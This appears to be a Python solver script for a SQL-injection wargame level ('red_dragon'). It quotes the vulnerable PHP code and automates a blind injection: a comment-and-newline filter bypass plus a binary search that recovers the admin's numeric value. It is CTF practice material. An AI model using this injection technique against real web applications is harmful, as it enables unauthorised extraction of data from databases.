#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Red_dragon 26

    if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
    if(strlen($_GET['id']) > 7) exit("too long string");
    $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
    $query = "select id from prob_red_dragon where id='{$_GET['id']}' and no={$no}";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

    $query = "select no from prob_red_dragon where id='admin'";
    // if you think challenge got wrong, look column name again.
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['no'] === $_GET['no']) solve("red_dragon");
    """

    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'no'
    other_param = {'id': "'||no<#"}

    payload = '\n%s'
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    result = p.one_binary(check_func, left=1, right=1e10)

    p.payload = str(int(result))
    p.other_param = {'id': 'admin'}
    response = p.my_request()
    if 'Clear!' in response:
        print('\nRed_dragon Clear!')


if __name__ == '__main__':
    main()
